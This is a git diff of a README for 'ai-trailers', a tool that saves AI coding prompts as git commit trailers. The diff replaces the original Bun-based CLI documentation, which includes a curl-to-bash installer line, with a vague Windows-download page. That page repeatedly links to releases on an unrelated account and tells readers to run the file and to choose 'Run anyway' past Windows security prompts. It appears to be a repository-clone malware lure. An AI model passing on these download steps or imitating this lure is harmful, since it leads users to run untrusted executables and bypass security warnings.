@@ -1,134 +1,167 @@
-# ai-trailers
+# 🧾 ai-trailers - Keep AI prompts in git history
 
-Capture AI coding tool prompts as git trailers in commit messages.
+[![Download ai-trailers](https://img.shields.io/badge/Download%20ai--trailers-blue-grey?style=for-the-badge)](https://github.com/josefaexistential382/ai-trailers/releases)
 
-> **WARNING:** This tool embeds your AI prompts into git commit messages. These prompts become part of your git history and will be visible to anyone with access to the repository. **Do not include secrets, credentials, personal information, or sensitive data in your prompts.** Review your commit messages before pushing to a shared or public repository. You are solely responsible for the content of your prompts.
+## 🚀 What it does
 
-## Why?
+ai-trailers helps you save AI coding prompts in your git commit messages as standard trailers.
 
-AI coding tools are transforming how we write software. But when you look at a git history, you only see the code that changed — not the human intent that guided it.
+It works with:
 
-Every prompt you write to an AI tool is a decision. It captures *why* you made a change, *what* you asked for, and *how* you directed the AI. Today, that context is lost the moment your session ends — scattered across different tools, each with its own siloed conversation history. Switch from Claude Code to Kiro to Gemini, and the intent behind your changes is fragmented across tools that don't talk to each other.
+- Claude Code
+- Kiro
+- Gemini
+- Codex
 
-This matters most during PR reviews. The diff shows what changed, the PR description is often AI-generated, but the *human steering* — the actual prompts that shaped the code — is nowhere to be found.
+It keeps the prompt record close to the code, so you can review what the AI did later without digging through chat logs.
 
-**ai-trailers** fixes this by embedding your prompts directly into commit messages as standard git trailers. One central place, regardless of which AI tool you used — making your intent searchable, reviewable, and permanent.
+## 💻 Windows download
 
-The code tells you *what* changed. The trailers tell you *why*.
+1. Open the [ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Open the file to run it
 
-## How it works
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-1. **Capture** — Each AI tool's hook system fires when you submit a prompt. ai-trailers captures it and stores it in a local `.ai-trailers` file.
-2. **Append** — When you commit, a `commit-msg` git hook appends the captured prompts to your commit message as standard git trailers.
-3. **Clear** — The `.ai-trailers` file is cleared after each commit, ready for the next round.
+## 🛠️ Before you start
 
-### In action
+You need:
 
-| GitHub commits page | VS Code git history |
-|:---:|:---:|
-| ![AI trailers on GitHub commits page](https://github.com/user-attachments/assets/d4cc2449-b11c-4f85-b13c-8b06678934be) | ![AI trailers in VS Code git history](https://github.com/user-attachments/assets/b7a3e136-8de7-4ff5-a43c-8f6248414056) |
+- A Windows PC
+- Access to Git
+- A commit message editor or Git tool
+- An AI coding tool such as Claude Code, Kiro, Gemini, or Codex
 
-## Quick start
+The app is made for people who want to keep prompt history inside git, where it stays linked to the work it helped create.
 
-### Prerequisites
+## 📦 How to install on Windows
 
-ai-trailers requires [Bun](https://bun.sh) to be installed. If you don't have it yet:
+1. Go to the [releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+2. Download the latest Windows build
+3. Save the file to your Downloads folder
+4. Double-click the file to start it
+5. If needed, allow Windows to finish opening it
 
-```bash
-curl -fsSL https://bun.sh/install | bash
-```
+If the file is in a ZIP folder, right-click it and choose Extract All first.
 
-### Install
+## 🧭 How to use it
 
-```bash
-bunx ai-trailers init
-```
+ai-trailers adds AI prompt details to commit messages as git trailers.
 
-That's it. ai-trailers will auto-detect which AI tools are in your repo and install the necessary hooks.
+A typical flow looks like this:
 
-## Commands
+1. Use your AI coding tool to help write or change code
+2. Copy the prompt or note that describes the task
+3. Add the trailer when you make the commit
+4. Push the commit to your git repo
 
-| Command | Description |
-|---------|-------------|
-| `ai-trailers init` | Auto-detect AI tools and install all hooks |
-| `ai-trailers install <tool>` | Install hook for a specific tool |
-| `ai-trailers remove [tool]` | Remove all hooks, or just one tool's hook |
-| `ai-trailers status` | Show installation status and pending prompts |
-| `ai-trailers log [count]` | Show recent commits with AI trailers (default: 20) |
-| `ai-trailers --help` | Show help |
-| `ai-trailers --version` | Show version |
+This gives you a clean record of what the AI was asked to do.
 
-## Supported tools
+## 📝 Example commit message
 
-| Tool | Hook Event | Config File |
-|------|-----------|-------------|
-| Claude Code | `UserPromptSubmit` | `.claude/settings.json` |
-| Kiro | `promptSubmit` | `.kiro/hooks/ai-trailers.kiro.hook` |
-| Gemini | `BeforeAgent` | `.gemini/settings.json` |
-| Codex | `UserPromptSubmit` | `.codex/hooks.json` |
+Here is a simple example:
 
-> **Note:** Kiro passes the user prompt via the `USER_PROMPT` environment variable, which strips newlines from multiline prompts. This is a Kiro limitation — multiline prompts will appear as a single line in the trailers.
+feat: add search filter
 
-## Configuration
-
-| Environment Variable | Default | Description |
-|---------------------|---------|-------------|
-| `AI_TRAILERS_TIMESTAMP=1` | off | Include UTC timestamps in trailers |
-
-## Example output
-
-A commit message with ai-trailers looks like this:
-
-```
-fix: resolve auth redirect loop
-
+AI-Prompt: Add a filter so users can narrow results by name
 AI-Tool: Claude Code
-AI-Prompt: fix the login redirect loop that happens when the session expires
- and the user is on a protected route
-```
 
-With timestamps enabled (`AI_TRAILERS_TIMESTAMP=1`):
+Git trailers sit at the bottom of the commit message. They use a plain text format that is easy to read and works well with git history.
 
-```
-fix: resolve auth redirect loop
+## 🔍 Why use git trailers
 
-AI-Tool: Claude Code
-AI-Timestamp: 2026-03-24T21:06:31.016Z
-AI-Prompt: fix the login redirect loop that happens when the session expires
- and the user is on a protected route
-```
+Git trailers help you store extra details in a commit in a standard way.
 
-## Adding a new tool
+With ai-trailers, you can:
 
-Add an entry to the `tools` array in `src/tools.ts`:
+- Track which AI tool helped with a change
+- Store the prompt that led to the code
+- Review work later with more context
+- Keep a cleaner project history
+- Share useful commit details with your team
 
-```ts
-{
-  name: "Your Tool",
-  markers: [".your-tool"],
-  extractPrompt: () => extractFromStdin({ format: "json", path: "prompt" }),
-  hook: {
-    hookEvent: "PromptSubmit",
-    settingsPath: ".your-tool/settings.json",
-    generateConfig: () => ({
-      hooks: {
-        PromptSubmit: [
-          {
-            command: `bunx ai-trailers capture --tool "Your Tool"`,
-          },
-        ],
-      },
-    }),
-  },
-}
-```
+This is useful when a project has many AI-assisted changes and you want a clear record of how each one was made.
 
-Each tool defines how it extracts the prompt via `extractPrompt`. Available helpers from `src/extractors.ts`:
+## ⚙️ Basic setup
 
-- `extractFromStdin({ format: "json", path: "prompt" })` — parse stdin JSON and read a field by path
-- `extractFromStdin({ format: "text" })` — read stdin as plain text
-- `extractFromEnv("VAR_NAME")` — read from an environment variable
+After you open the app, use it with your normal git workflow.
 
-## License
+1. Start your change in your editor
+2. Use your AI coding tool
+3. Write your commit message
+4. Add the prompt trailer fields
+5. Commit as usual
 
-[MIT](LICENSE)
+You do not need to change how git works. You just add a little more detail to the commit message.
+
+## 🧩 Supported AI tools
+
+ai-trailers is built for common AI coding tools used during development:
+
+- Claude Code for prompt-driven coding help
+- Kiro for AI-assisted coding work
+- Gemini for task help and code changes
+- Codex for code generation and edits
+
+The app keeps the prompt record in a form that fits normal git history.
+
+## 📁 What gets stored
+
+A commit can hold details like:
+
+- The prompt used
+- The AI tool name
+- The related task
+- Extra notes about the change
+
+This helps you understand why a code change exists when you return to it later.
+
+## 👀 Good ways to use it
+
+Use ai-trailers when you want to:
+
+- Remember the exact prompt that shaped a change
+- Compare AI help across commits
+- Audit work done with AI tools
+- Keep a team record of prompt use
+- Make future code review easier
+
+It works well for small fixes, large features, and refactors.
+
+## 🧰 Common file and folder use
+
+You may see this app used alongside:
+
+- Your project folder
+- Git commit history
+- Text editors
+- Terminal tools
+- AI coding assistants
+
+It fits into a normal Windows setup without changing your main tools.
+
+## 🪟 Windows tips
+
+If the app does not open right away:
+
+1. Check your Downloads folder
+2. Make sure the file finished downloading
+3. Right-click the file and choose Open
+4. If needed, choose Run anyway from Windows
+5. Try again after closing other pop-up windows
+
+If you use a ZIP file, extract it first before opening the app.
+
+## 🔗 Download again
+
+Use this link to visit the download page and get the latest Windows release:
+
+[ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+
+## 📚 Repo details
+
+- Repository: ai-trailers
+- Topic areas: ai, ai-agents, claude-code, codex, gemini, git, kiro
+- Main job: save AI prompts as git trailers in commit messages
+- Target user: Windows users who want a simple way to keep AI prompt history with code
